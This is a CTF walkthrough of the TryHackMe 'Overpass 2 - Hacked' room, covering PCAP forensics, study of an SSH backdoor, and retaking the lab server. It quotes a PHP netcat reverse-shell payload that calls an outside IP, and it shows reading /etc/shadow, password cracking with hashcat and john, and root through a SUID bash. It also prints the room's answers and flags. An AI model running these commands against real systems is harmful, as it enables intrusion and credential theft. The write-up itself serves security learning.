# TryHackMe Room: Overpass 2 - Hacked

Link: [Overpass 2 - Hacked](https://tryhackme.com/room/overpass2hacked)

## Overview

Overpass has been hacked! The SOC team (Paradox, congratulations on the promotion) noticed suspicious activity on a late night shift while looking at `shibes`, and managed to capture packets as the attack happened.

`Q: Can you work out how the attacker got in, and hacked your way back into Overpass' production server?`

> **Note:** Although this room is a walkthrough, it expects familiarity with tools and Linux. I recommend learning basic Wireshark and completing [CC: Pentesting](https://tryhackme.com/room/ccpentesting) and [Learn Linux](https://tryhackme.com/room/zthlinux) as a bare minimum.  

```
md5sum of PCAP file: 11c3b2e9221865580295bc662c35c6dc
```

##  Task 1  Forensics - Analyse the PCAP 

First Download the Capture file from TryHackme Overpass 2 room there you will see the button named `Download Task File` Download it and after you download it open **Wireshark** which is preinstalled in Kali linux open it. When wireshark is open go to the File menu in the Toolbar there you will see the option name `Open` or you can just press `Ctrl + O` there you will prompt to open a file so open the file that you Download from tryhackme.

When you open the file then you will see all the packets that are captured during the attack so now let's start the analysis 

Q: What was the URL of the page they used to upload a reverse shell?

```
A: /development/
```

**Solution**

First, we have to filter our packets to http As there are so many packets there so we have to filter it so go to the filter bar you can see this after the Toolbar there write HTTP and press enter so then you will see all the packets that are related to http protocol

When your result is filtered locate the packet that is used to upload a file name "`upload.php`" You can see this in the info tab of the packets so there you will find the url the attacker uses to get the reverse shell. The attacker uses the POST method to that link to Upload its Payload to the server

Q: What payload did the attacker use to gain access?

**Hint: Include the PHP tags. Whole file content.**

```
A: <?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
```

**Solution**

So Now we know which vulnerable area attack is used to upload a reverse shell payload on the server. The attacker uses the `upload.php` function to upload a file name `payload.php` that contains some malicious php code that gives the attacker a reverse shell so we can see the content/data of that packet to identify what that payload does to the system.

As we focus on packet number 14 that is the packet contains the `upload.php` function so you just have to see the data of that packet and you can see this at the bottom tab of the wireshark click on the packet all the packet data where shown in that tab scroll down to the content and focus on it and there you will see the php code inside that packet just copy that packet

Q3: What password did the attacker use to privesc?

**Hint: A netcat reverse shell transmits everything in plaintext!**

```
A: whenevernoteartinstant
```

**Solution**

So we know which packet attack is used to activate the reverse shell. If not so I recap all the finding we do till then so we know which website directory the attacker go and we also know which file they use to upload a payload so now the attacker upload a working rev-shell payload uploaded but they did not give the rev-shell to the attacker except when attacker go to that file so the attacker must go to that directory so then the php code executes on the server and after that attacker got the rev-shell to its system. So we just have to know which packet the attacker sent to visit that payload file and that is packet number 27.

We can see the attacker send a GET request to `/development/uploads/payload.php` so after that attacker get the rev-shell and rev-shell are TCP connections so now we have to analyze the TCP packet or we can remove all the filters and just view all the packet after the packet number 27 one by one so there is some packets we can see that contain some output that we can understand and the attacker use just a normal enumeration process use ls command for list all the directories and use `python3` to get full `pty` shell so we can see that just view all the packet and in one packet we can see attacker use "`su james`" command and then shell prompt to enter the password and attacker use some password there we can see it 


Q4: How did the attacker establish persistence?

```
A:  https://github.com/NinjaJc01/ssh-backdoor
```

**Solution**

As we continue our packet analysis and we can see all the activities attackers use to get better privileges. The attacker uses common methods like using the "`sudo -l`" command and the attacker know the `james` user use all the command as `sudo` so the attacker use this to see the content of the linux shadow file with the following command "`sudo cat /etc/shadow`" and they successfully see the content of that file so that means the attacker has full privileges to the overpass server.

After getting full privileged to the server attacker try to add an ssh backdoor to the server and we can see it in the packet when we move to the packets. In packet number `121` the attacker use the `git clone` command to clone some file to the server

Q5: Using the `fasttrack` wordlist, how many of the system passwords were crackable?
**Hint: Did the attacker dump the shadow file? Try cracking them yourself.**

```
A: 4
```

**Solution**

In packet Number 114 attacker use "`sudo cat /etc/shadow`" to see the content of the `/etc/shadow` file. We can also see the content of the file in the wireshark bottom packet data tab so just copy all the shadow file content to the file with any name you want and use john or hashcat to crack the password with the wordlist "`fasttrack.txt`"
Command:

```bash
$ john <shadow_file_here> --wordlist=fasttrack.txt
```


==Here is a fun Tip about WireShark If you just click on the packet where the attacker interacts with the bash rev-shell like that packet where the attacker uses the "ls" command. Right Click on that packet and it will open a drop-down menu, You will see an option named "Follow" Hover into that option and you will see a Sub-drop-down menu. You will see an option "TCP stream" Click on it or You can just use "Ctrl+Alt+Shift+T" on that packet and you will see all the bash command the attacker uses in a clean bash like format==

## Task 2  Research - Analyze the code

Now that you've found the code for the backdoor, it's time to analyze it.

Q1: What's the default hash for the backdoor?
**Hint: Variable values!**

```
A: bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3
```

**Solution**

In the previous Task, we found out that the attacker downloads a backdoor file from the github using the following link: https://github.com/NinjaJc01/ssh-backdoor

Now time to analyze that code go to that link there is a source code file name "main. go". There you will see a variable name "hash string" In that variable you will find the default hash for the backdoor

Q2: What's the hard-coded salt for the backdoor?
**Hint: If you read the code, you can fairly quickly see what salt is provided to the function call.**
```
A:  1c362db832f3f864c8c2fe05f2002a05
```

**Solution**

Read all the code if you know a little bit of programming you get a rough idea of what the code does. Read all the way to the end and in the last line, you will find the salt hash that is used in the backdoor. Just keep in mind the position of the salt variable in the functions that you see above the code and you will find the salt hash for sure.

Q3: What was the hash that the attacker used? - go back to the PCAP for this!
**Hint: Reading the code, the -a or --a [hash] flag can be used to supply a hash at runtime.**

```
A: 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
```

**Solution**

Now come back again to wireshark and start your packet analyses after the backdoor is downloaded or you can Follow the attacker Bash TCP stream. In wire shark packet number `3479` you can see the attacker use the"`./backdoor`" command and pass the `-a` flag and after that attacker put its own hash. see it and submit it

Q4: Crack the hash using rockyou and a cracking tool of your choice. What's the password?
**Hint: It's salted, so make sure you use the correct mode. This also means crackstation etc won't work.**

Now we have to crack the hash attacker used in the ssh backdoor so we just use any regular cracking tool for this but I use Hashcat there. So first we have to know what type of hash the attacker uses so do that we can use the hash-identifier tool you can install it with the following command

```bash
$ sudo apt install hash-identifier
```

When this will install open it using the simple command "hash-identifier" and paste the hash in the tool they will show you the hash type

```bash
$ hash-identifier

   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed

Possible Hashs:
[+] SHA-512
[+] Whirlpool

Least Possible Hashs:
[+] SHA-512(HMAC)
[+] Whirlpool(HMAC)
----------------------------------------------------------------------------------
```

As you can see this is SHA-512 hash but we can't crack it using the online tool because they add salt to that hash so we have to use our cracking tools like hashcat and john.

So now follow the following steps to crack that hash using hash cat 

Step 1: 
- In the first step, we have to find the hashcat code for sha512 with salt so to do that we use the following command

```bash
$ hashcat --help | grep sha512
```

This will show us all the hashcat code that is for `sha512` but we have to pick the one that has passed with salt because our hash use salt in it so we can use the following hash code.

```
1710 | sha512($pass.$salt)               | Raw Hash, Salted and/or Iterated
```

Now we know which hashcat code we have used so now we can move to crack the hash step

**Step 2:**

- In this step, we first have to make two files one name is hash, and the other one is cracked or you can use your own name of your choice. So in the hash file, you have to write the hash you want to crack but you have to focus on the format because this is a salted hash so you have to write the hash in the following format

```
Hash:Salt
```

So following that format in our hash file, we write the attacker hash and the backdoor salt is like this 

```
6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05
```

So that's it now we use the following hashcat command to crack that hash 

Command: 

```
$ hashcat -m 1710 -a 0 hash rockyou.txt -o cracked
```

- `-m`: This is used to specify the hashcat cracking method i.e `1710` is for `Sha512` with salt
- `-a`: This is used to specify hashcat attacking mode i.e `0` is for wordlist attack
- `hash`: This is the hash file we create and that contains our hash with salt
- `rockyou.txt`: This is the cracking wordlist we use to crack that hash.
- `cracked`: This is the file where hashcat save the cracked password after successful cracking

So That's it when the hashcat finish the cracking we found our cracked password in the cracked file just use the "cat" command to see the cracked file content

```
A: november16
```


## Task 3  Attack - Get back in!
Now that the incident is investigated, Paradox needs someone to take control of the Overpass production server again.

There are flags on the box that Overpass can't afford to lose by formatting the server!

## Enumeration

**Nmap scan Report**

```bash
$ nmap -sCV 10.10.142.182
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-27 15:05 Pakistan Standard Time
Stats: 0:01:04 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.76% done; ETC: 15:06 (0:00:00 remaining)
Nmap scan report for 10.10.142.182
Host is up (0.17s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e4:3a:be:ed:ff:a7:02:d2:6a:d6:d0:bb:7f:38:5e:cb (RSA)
|   256 fc:6f:22:c2:13:4f:9c:62:4f:90:c9:3a:7e:77:d6:d4 (ECDSA)
|_  256 15:fd:40:0a:65:59:a9:b5:0e:57:1b:23:0a:96:63:05 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: LOL Hacked
2222/tcp open  ssh     OpenSSH 8.2p1 Debian 4 (protocol 2.0)
| ssh-hostkey:
|_  2048 a2:a6:d2:18:79:e3:b0:20:a2:4f:aa:b6:ac:2e:6b:f2 (RSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap did: 1 IP address (1 host up) scanned in 71.16 seconds
```

So we can see from our nmap scan report there is three open port one is for http and the remaining two have ssh service running on it and we know port `22` is opened by the overpass management but port `2222` is opened by the attacker and that is a backdoor add by the attacker and we have complete our analysis and we know the password for the attacker ssh backdoor and we know they use the username `James` so we can use attacker backdoor with all the information we know to get access to the system using the following command

Q1: The attacker defaced the website. What message did they leave as a heading?

```
A: H4ck3d by CooctusClan
```

When going to the overpass website's main page attackers change the page layout and use some pictures and Change the title heading after that they write the message "`Secure your Servers!`"

Q2: Using the information you've found previously, hack your way back in!

```
$  ssh james@10.10.142.182 -p 2222
```

Where 
- `-p`:  To specify port number because they are not located in a well-known port

Give him the password you cracked in the previous task using hashcat and you will login to the server

Q3: What's the user flag?
**Hint: The backdoor! It only checks the password.**

```
A: thm{d119b4fa8c497ddb0525f7ad200e6567}
```

When you have access to the system go to the home directory of the `James` user and in their home directory you will find the `user.txt` file that contains the flag and submit it to THM

Q4: What's the root flag?
**Hint: Did the attacker leave a quick way for them to get root again without a password?**

```
A: thm{d53b2684f169360bb9606c333873144d}
```

When we use the find command to find some `suid` binaries with the following command 

```bash
$ find / -perm /4000 2>/dev/null
```

We found out that there is a file in the `James` home directory with the name "`.suid_bash`" and they are owned by the root user so when we search bash on GTFObins we found out that if we use "`bash -p`" so we can get root access so now let's try this using what we have with the following command 

```bash
$ ./.suid_bash -p
```

And we got it we got the root access now go to the root directory and read the `root.txt` flag
